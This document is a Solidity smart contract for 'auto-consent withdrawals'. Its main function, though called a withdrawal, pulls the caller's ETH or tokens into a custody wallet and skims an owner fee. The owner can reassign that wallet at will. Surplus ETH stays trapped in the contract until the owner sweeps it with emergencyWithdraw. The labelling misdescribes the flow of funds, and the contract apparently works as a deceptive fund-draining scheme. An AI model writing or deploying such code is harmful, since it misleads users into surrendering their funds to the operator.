// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract SimpleAutoConsentWithdrawal {
    address public owner;
    address public custodyWallet;
    uint256 public withdrawalFee; // Fee in basis points (100 = 1%)
    bool public paused = false;
    
    mapping(address => bool) public autoConsentEnabled;
    mapping(bytes32 => WithdrawalRecord) public withdrawals;
    
    struct WithdrawalRecord {
        address user;
        address token;
        uint256 amount;
        uint256 timestamp;
        bool completed;
    }
    
    event AutoConsentEnabled(address indexed user);
    event AutoConsentDisabled(address indexed user);
    event WithdrawalExecuted(
        bytes32 indexed transactionId,
        address indexed user,
        address indexed token,
        uint256 amount,
        uint256 fee
    );
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    modifier whenNotPaused() {
        require(!paused, "Contract paused");
        _;
    }
    
    constructor(address _custodyWallet) {
        owner = msg.sender;
        custodyWallet = _custodyWallet;
        withdrawalFee = 100; // 1% default fee
    }
    
    // Enable auto-consent for seamless withdrawals
    function enableAutoConsent() external {
        autoConsentEnabled[msg.sender] = true;
        emit AutoConsentEnabled(msg.sender);
    }
    
    // Disable auto-consent
    function disableAutoConsent() external {
        autoConsentEnabled[msg.sender] = false;
        emit AutoConsentDisabled(msg.sender);
    }
    
    // Auto-withdrawal with instant consent
    function withdrawWithAutoConsent(
        address token,
        uint256 amount
    ) external payable whenNotPaused returns (bytes32) {
        require(amount > 0, "Invalid amount");
        require(autoConsentEnabled[msg.sender], "Auto-consent not enabled");
        
        bytes32 transactionId = keccak256(
            abi.encodePacked(msg.sender, token, amount, block.timestamp)
        );
        
        uint256 feeAmount = (amount * withdrawalFee) / 10000;
        uint256 transferAmount = amount - feeAmount;
        
        if (token == address(0)) {
            // Native token (ETH, MATIC, BNB, etc.)
            require(msg.value >= amount, "Insufficient ETH sent");
            
            payable(custodyWallet).transfer(transferAmount);
            if (feeAmount > 0) {
                payable(owner).transfer(feeAmount);
            }
        } else {
            // ERC20 token
            IERC20 tokenContract = IERC20(token);
            require(
                tokenContract.transferFrom(msg.sender, custodyWallet, transferAmount),
                "Transfer failed"
            );
            
            if (feeAmount > 0) {
                require(
                    tokenContract.transferFrom(msg.sender, owner, feeAmount),
                    "Fee transfer failed"
                );
            }
        }
        
        // Record withdrawal
        withdrawals[transactionId] = WithdrawalRecord({
            user: msg.sender,
            token: token,
            amount: amount,
            timestamp: block.timestamp,
            completed: true
        });
        
        emit WithdrawalExecuted(transactionId, msg.sender, token, amount, feeAmount);
        return transactionId;
    }
    
    // Check if user has auto-consent enabled
    function hasAutoConsent(address user) external view returns (bool) {
        return autoConsentEnabled[user];
    }
    
    // Get withdrawal details
    function getWithdrawal(bytes32 transactionId) external view returns (WithdrawalRecord memory) {
        return withdrawals[transactionId];
    }
    
    // Owner functions
    function setCustodyWallet(address newWallet) external onlyOwner {
        custodyWallet = newWallet;
    }
    
    function setWithdrawalFee(uint256 newFee) external onlyOwner {
        require(newFee <= 500, "Fee too high"); // Max 5%
        withdrawalFee = newFee;
    }
    
    function pause() external onlyOwner {
        paused = true;
    }
    
    function unpause() external onlyOwner {
        paused = false;
    }
    
    function emergencyWithdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    receive() external payable {}
}